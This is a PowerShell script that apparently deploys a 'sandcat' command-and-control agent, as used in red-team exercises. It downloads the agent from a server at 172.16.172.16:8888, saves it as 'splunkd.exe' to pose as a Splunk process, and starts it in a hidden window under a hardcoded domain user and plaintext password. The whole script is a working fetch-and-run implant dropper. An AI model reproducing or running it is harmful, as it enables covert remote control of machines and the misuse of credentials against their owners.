$UserName = "Sundar"
$DomainName = "ACME"
$NTLMHash = "Password12345"
# NTLM Hash 8c3efc486704d2ee71eebe71af14d86c
$SecureNTLMHash = ConvertTo-SecureString -String $NTLMHash -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential("$DomainName\$UserName", $SecureNTLMHash)

$server = "http://172.16.172.16:8888"
$file = "C:\Users\Public\splunkd.exe"

if (Test-Path $file) {
    $runningProcess = Get-Process | Where-Object { $_.Modules.FileName -eq $file }
    if ($runningProcess) {
        $runningProcess | Stop-Process -Force
    }

    Remove-Item -Path $file -ErrorAction Ignore -Force
}

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("platform", "windows")
$wc.Headers.Add("file", "sandcat.go")
$data = $wc.DownloadData("$server/file/download")

[IO.File]::WriteAllBytes($file, $data) | Out-Null

try {
    $processArgs = @{
        FilePath = $file
        ArgumentList = "-server $server -group red"
        WindowStyle = "Hidden"
        Credential = $Credential
    }

    Start-Process @processArgs -ErrorAction Stop

    Write-Host "Script executed successfully!"
} catch {
    Write-Host "Error occurred during process start:"
    Write-Host $_.Exception.Message
}



